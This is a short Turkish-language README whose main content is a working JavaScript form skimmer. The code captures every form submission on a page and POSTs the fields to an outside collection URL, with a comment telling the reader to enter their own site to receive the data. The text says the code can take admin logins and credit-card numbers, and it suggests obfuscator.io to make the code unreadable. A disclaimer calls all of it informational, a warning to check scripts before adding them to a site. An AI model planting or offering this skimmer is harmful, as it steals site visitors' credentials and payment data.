# Adding_Open_to_Script_Front_End

## TAMAMEN BİLGİLENDİRME AMAÇLIDIR BASİT BİR JAVASCRİPT KODUNUN BAŞINIZA AÇABİLECEĞİ SORUNLARI GÖRMENİZ İÇİN

## Kod

```js

document.addEventListener('DOMContentLoaded', function() {
  var forms = document.querySelectorAll('form'); 
  forms.forEach(function(form) {
    form.addEventListener('submit', function(event) {

      var formData = new FormData(form);

      fetch('https://mysite.com/target', { // Kendi sitenizin linkini girin dataları oradan alacaksınız
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: new URLSearchParams(formData)
      })
      .then(function(response) {
        if (response.ok) {
          console.log('Form bilgileri başarıyla gönderildi.');
        } else {
          console.log('Bir hata oluştu. İstek durumu:', response.status);
        }
      })
      .catch(function(error) {
        console.log('Bir hata oluştu:', error);
      });

      form.reset();
    });
  });
});

```

## Ne işe yarıyor?

Yukarıdaki Kod Sayesinde Yaptığınız Front End'e Bir Açık Ekleyebilirsiniz (Tam Olarak Açık Sayılmaz. Sadece Form'a Girilen Bilgileri Kendi Sitenize Post Ediyorsunuz). Bu sayede admin paneli giriş bilgilerinizi veya kredi kartı bilgilerinizi çaldırabilirsiniz. Bu Sebepten dolayı javascript kodlarını inceleyin her bulduğunuz şeyi sitenize direkt olarak eklemeyin.

- Ek olarak

https://obfuscator.io/ üzerinden şifrelenmiş ise kod anlamanız imkansız olur. Sadece geliştirici sekmesindeki ağ kısmından fark edebilirsiniz.

---
- ✨ [Destek İçin](https://fastuptime.com) <br>
- 💕 [Discord](https://fastuptime.com/discord)<br>
- 🎖️ [FasterHost Technology](https://fasterhost.tech/)<br>
- ✨ İletişim için [Tıkla!](mailto:fastuptime@gmail.com)<br>

# License
- Its protected by Creative Commons ([CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/))

<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" title="BYNCSA40"><img src="https://licensebuttons.net/l/by-nc-sa/4.0/88x31.png"></a>
